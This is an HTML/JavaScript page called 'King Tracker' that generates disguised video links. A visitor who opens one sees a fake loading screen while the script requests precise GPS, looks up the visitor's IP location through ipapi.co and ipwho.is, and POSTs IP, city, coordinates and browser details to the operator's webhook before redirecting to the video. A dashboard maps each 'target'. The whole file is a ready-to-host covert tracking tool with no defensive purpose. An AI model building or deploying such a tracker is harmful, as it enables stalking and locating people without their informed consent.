<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>King Tracker</title> <!-- Title updated to King Tracker -->
    <style>
        :root {
            --primary: #00ff41;
            /* Hacker Green */
            --secondary: #008f11;
            --accent: #ff003c;
            /* Cyber Red */
            --bg: #0b0e14;
            --card-bg: rgba(255, 255, 255, 0.05);
        }

        @keyframes rgb-border {
            0% {
                border-color: #ff0000;
                box-shadow: 0 0 10px #ff0000;
            }

            33% {
                border-color: #00ff00;
                box-shadow: 0 0 10px #00ff00;
            }

            66% {
                border-color: #0000ff;
                box-shadow: 0 0 10px #0000ff;
            }

            100% {
                border-color: #ff0000;
                box-shadow: 0 0 10px #ff0000;
            }
        }

        @keyframes gradient-text {
            0% {
                background-position: 0% 50%;
            }

            50% {
                background-position: 100% 50%;
            }

            100% {
                background-position: 0% 50%;
            }
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg);
            color: #ffffff;
            display: flex;
            /* Sidebar layout ke liye flex use kiya */
            min-height: 100vh;
            margin: 0;
            overflow-x: hidden;
        }

        .sidebar {
            width: 260px;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(15px);
            border-right: 1px solid var(--primary);
            display: flex;
            flex-direction: column;
            gap: 15px;
            padding: 30px 20px;
            height: 100vh;
            position: sticky;
            top: 0;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .sidebar h3 {
            color: var(--primary);
            text-align: center;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .nav-btn {
            background: var(--card-bg);
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
            font-weight: bold;
        }

        .nav-btn.active {
            background: var(--primary);
            color: #000;
            box-shadow: 0 0 15px var(--primary);
        }

        .container {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border: 2px solid transparent;
            animation: rgb-border 5s infinite linear;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            width: 90%;
            max-width: 400px;
            display: none;
            /* Controlled by JS */
        }

        .container.active {
            display: block;
        }

        h2 {
            font-size: 2.2rem;
            margin-bottom: 20px;
            background: linear-gradient(to right, var(--primary), #fff, var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 200% auto;
            animation: gradient-text 3s infinite linear;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            box-sizing: border-box;
            color: white;
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 15px var(--primary);
        }

        button {
            background: linear-gradient(45deg, var(--secondary), #000);
            border: 1px solid var(--primary);
            color: white;
            border: none;
            padding: 15px 20px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            font-weight: bold;
            text-transform: uppercase;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.2);
        }

        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px var(--primary);
        }

        #result {
            margin-top: 20px;
            word-wrap: break-word;
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            display: none;
            text-align: left;
            border-left: 4px solid var(--primary);
        }

        #result strong {
            color: var(--primary);
        }

        #generatedLink {
            color: #fff;
            font-weight: bold;
            font-size: 0.9rem;
        }

        .hidden {
            display: none;
        }

        #redirect-ui {
            text-align: center;
            color: #fff;
        }

        #redirect-ui h1 {
            color: var(--primary);
            text-shadow: 0 0 20px var(--primary);
        }

        .admin-section {
            margin-top: 30px;
            width: 90%;
            max-width: 800px;
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 50px;
            display: none;
        }

        .admin-section.active {
            display: block;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            font-size: 13px;
        }

        th,
        td {
            padding: 10px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: left;
        }

        th {
            background-color: rgba(0, 255, 65, 0.1);
            color: var(--primary);
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }

            .sidebar {
                width: 100%;
                height: auto;
                position: relative;
                padding: 15px;
            }
        }

        #logTable tbody tr:hover {
            background-color: rgba(0, 255, 65, 0.05);
            cursor: pointer;
        }

        .watch-btn {
            background: var(--accent);
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 11px;
        }
    </style>
</head>

<body>

    <div class="sidebar" id="sidebar">
        <h3>King Panel</h3>
        <button class="nav-btn active" onclick="showSection('main-ui', this)">Link Creator</button>
        <button class="nav-btn" onclick="showSection('admin-dashboard', this)">King Dashboard</button>
    </div>

    <div class="main-content">
        <div class="container active" id="main-ui">
            <h2>King Tracker</h2>
            <p style="color: #888;">Generate tracking link for any video</p>

            <input type="text" id="linkName" placeholder="Link ka naam (e.g., Target 1)">
            <input type="url" id="videoUrl" placeholder="Video URL (e.g., YouTube Link)">
            <input type="text" id="loadingText" placeholder="Custom loading message (Optional)">

            <button onclick="generateLink()">Link Banayein</button>

            <div id="result">
                <strong>Aapka Tracking Link:</strong><br>
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 10px;">
                    <a id="generatedLink" href="#" target="_blank"
                        style="word-break: break-all; color: var(--primary); text-decoration: underline; font-size: 0.8rem;"></a>
                    <button onclick="copyLink()" id="copyBtn"
                        style="padding: 8px; font-size: 14px; background: var(--primary); color: #000;">
                        Copy Link
                    </button>
                </div>
            </div>
        </div>

        <!-- Admin Dashboard Section -->
        <div class="admin-section" id="admin-dashboard">
            <h3>King Dashboard (Recent Activity)</h3>
            <p style="font-size: 0.8em; color: #888;">Click on row to see Location Map. Use 'Watch' to see target video.
            </p>
            <div style="overflow-x: auto;">
                <table id="logTable">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>IP Address</th>
                            <th>Location</th>
                            <th>Time</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody id="logBody">
                        <!-- Logs will appear here -->
                    </tbody>
                </table>
            </div>
            <button onclick="openWebhookDashboard()" style="margin-top: 10px;">Open Real-Time Webhook Panel</button>
        </div>

        <!-- Redirecting Message (Initially Hidden) -->
        <div id="redirect-ui" class="hidden">
            <h1 id="redirect-header">Video Load Ho Raha Hai...</h1>
            <p id="redirect-subtext">Kripya intezaar karein.</p>
        </div>
    </div>

    <script>
        // --- Configuration ---
        // Aapko apni location details receive karne ke liye ek 'Webhook' ya API ki zarurat hogi.
        // Aap 'https://webhook.site' se ek URL le kar yahan paste kar sakte hain.
        // Jab koi aapka link kholega, uski details is URL par bhej di jayengi.
        const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"; // Yahan apna Webhook URL daalein!

        // --- UI Control Functions ---
        function showSection(id, btn) {
            document.querySelectorAll('.container, .admin-section').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(el => el.classList.remove('active'));

            document.getElementById(id).classList.add('active');
            btn.classList.add('active');

            if (id === 'admin-dashboard') loadLocalLogs();
        }

        function openWebhookDashboard() {
            if (WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE")) {
                alert("Warning: Aapne apna Webhook URL set nahi kiya hai. Kripya code mein 'YOUR_WEBHOOK_URL_HERE' ko apne Webhook.site URL se badlein.");
                return;
            }
            const dashboardUrl = WEBHOOK_URL.replace('https://webhook.site/', 'https://webhook.site/#!/');
            window.open(dashboardUrl, '_blank');
        }

        function generateLink() {
            const videoUrl = document.getElementById('videoUrl').value;
            if (!videoUrl) {
                alert("Kripya video link daalein!");
                return;
            }

            const linkName = document.getElementById('linkName').value || 'Unnamed';
            const loadingMsg = document.getElementById('loadingText').value || 'Video Load Ho Raha Hai...';

            // Create config object
            const config = {
                u: videoUrl,
                n: linkName,
                m: loadingMsg
            };

            const baseUrl = window.location.href.split('?')[0];

            // Agar aap local file use kar rahe hain (file://), to apps ise link nahi manenge.
            // Isko host karna zaroori hai (GitHub Pages/Netlify par).
            if (baseUrl.startsWith('file:///')) {
                alert("Warning: Aap local file use kar rahe hain. Ye link sirf aapke computer par chalega. Isse internet par chalane ke liye GitHub ya Netlify par host karein.");
            }

            const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(config))));
            const trackingLink = `${baseUrl}?data=${encodedData}`;

            document.getElementById('result').style.display = 'block';
            document.getElementById('generatedLink').innerText = trackingLink;
            document.getElementById('generatedLink').href = trackingLink;
            document.getElementById('copyBtn').innerText = "Copy Link";
        }

        function copyLink() {
            const link = document.getElementById('generatedLink').href;
            navigator.clipboard.writeText(link).then(() => {
                const btn = document.getElementById('copyBtn');
                btn.innerText = "Copied! ✅";
                setTimeout(() => btn.innerText = "Copy Link", 2000);
            });
        }

        // --- Tracking Logic ---
        window.onload = function () {
            const urlParams = new URLSearchParams(window.location.search);
            // dataEncoded parameter mein saari link ki information hoti hai (video URL, name, message)
            const dataEncoded = urlParams.get('data');

            if (dataEncoded) {
                try {
                    // Unicode support ke liye safe decoding
                    const config = JSON.parse(decodeURIComponent(escape(atob(dataEncoded))));

                    document.getElementById('main-ui').style.display = 'none';
                    if (document.querySelector('.sidebar')) document.querySelector('.sidebar').style.display = 'none';
                    document.getElementById('admin-dashboard').style.display = 'none';
                    document.getElementById('redirect-ui').classList.remove('hidden');
                    document.getElementById('redirect-header').innerText = config.m;

                    const targetUrl = config.u;
                    let visitorData = {
                        link_label: config.n,
                        redirect_url: targetUrl,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        ip: 'Unknown', city: 'Unknown', lat: null, lon: null
                    };

                    const finalRedirect = (delay = 2500) => { // Default delay 2.5 seconds
                        setTimeout(() => { window.location.href = targetUrl; }, delay);
                    };

                    const collectAndSend = (geoData) => {
                        // Try IP Provider 1 (ipapi.co)
                        fetch('https://ipapi.co/json/')
                            .then(res => res.json())
                            .then(ipData => {
                                console.log("IPAPI.co data:", ipData);
                                updateAndFinish(ipData, geoData);
                            })
                            .catch(ipapiErr => {
                                console.error("IPAPI.co fetch error:", ipapiErr);
                                // Fallback to IP Provider 2 (ipwho.is)
                                fetch('https://ipwho.is/')
                                    .then(res => res.json())
                                    .then(ipData => {
                                        console.log("IPWHO.is data:", ipData);
                                        updateAndFinish({
                                            ip: ipData.ip,
                                            city: ipData.city,
                                            country_name: ipData.country, // ipwho.is provides 'country'
                                            latitude: ipData.latitude,
                                            longitude: ipData.longitude
                                        }, geoData);
                                    })
                                    .catch(ipwhoErr => {
                                        console.error("IPWHO.is fetch error:", ipwhoErr);
                                        updateAndFinish(null, geoData); // No IP data, proceed with geoData or null
                                    });
                            });
                    };

                    const updateAndFinish = (ipData, geoData) => {
                        if (ipData) {
                            visitorData.ip = ipData.ip || 'Not available';
                            visitorData.city = ipData.city || 'Not available';
                            visitorData.country_name = ipData.country_name || ipData.country || 'Not available'; // Handle both ipapi.co and ipwho.is
                            visitorData.lat = (geoData && geoData.lat) ? geoData.lat : (ipData.latitude || null);
                            visitorData.lon = (geoData && geoData.lon) ? geoData.lon : (ipData.longitude || null);
                        } else if (geoData) {
                            visitorData.lat = geoData.lat;
                            visitorData.lon = geoData.lon;
                            visitorData.ip = 'Not available (GPS only)';
                            visitorData.city = 'Not available (GPS only)';
                            visitorData.country_name = 'Not available (GPS only)';
                        }

                        saveLogLocally(visitorData);
                        console.log("Final Visitor Data to send:", visitorData);

                        if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE") && WEBHOOK_URL.startsWith("http")) {
                            console.log("Sending data to Webhook:", WEBHOOK_URL);
                            fetch(WEBHOOK_URL, {
                                method: 'POST',
                                mode: 'no-cors',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(visitorData)
                            });
                        }
                        finalRedirect();
                    };

                    // Try Precise GPS first
                    if (navigator.geolocation) {
                        alert("King Tracker aapki location access karna chahta hai taaki aapko behtar tracking data mil sake. Kripya 'Allow' karein.");
                        console.log("Requesting Geolocation...");
                        navigator.geolocation.getCurrentPosition(
                            (pos) => collectAndSend({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                            (err) => { console.warn("Geolocation denied or error:", err); collectAndSend(null); },
                            { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 } // Increased timeout, force fresh data
                        );
                    } else {
                        console.warn("Geolocation not supported by browser or not available.");
                        collectAndSend(null);
                    }

                    // Emergency fallback redirect
                    setTimeout(() => { if (window.location.href !== targetUrl) finalRedirect(0); }, 10000); // 10 seconds fallback

                } catch (e) {
                    console.error("Invalid data parameter");
                    window.location.href = "/";
                }
            } else {
                loadLocalLogs();
            }
        };

        function saveLogLocally(data) {
            let logs = JSON.parse(localStorage.getItem('king_logs') || '[]');
            logs.unshift(data);
            localStorage.setItem('king_logs', JSON.stringify(logs.slice(0, 20)));
        }

        function loadLocalLogs() {
            const logs = JSON.parse(localStorage.getItem('king_logs') || '[]');
            const body = document.getElementById('logBody');
            body.innerHTML = '';
            logs.forEach(log => {
                const mapUrl = (log.lat && log.lon) ? `https://www.google.com/maps?q=${log.lat},${log.lon}` : '#';
                const row = `<tr>
                    <td>${log.link_label}</td>
                    <td>${log.ip}</td>
                    <td onclick="${mapUrl !== '#' ? `window.open('${mapUrl}', '_blank')` : 'alert(\'Location data missing\')'}" style="text-decoration: underline; color: var(--primary);">${log.city || 'Unknown'} (${log.country_name || 'N/A'})</td>
                    <td>${new Date(log.timestamp).toLocaleTimeString()}</td>
                    <td><a href="${log.redirect_url}" target="_blank" class="watch-btn">Watch Video</a></td>
                </tr>`;
                body.innerHTML += row;
            });
        }
    </script>
</body>

</html>
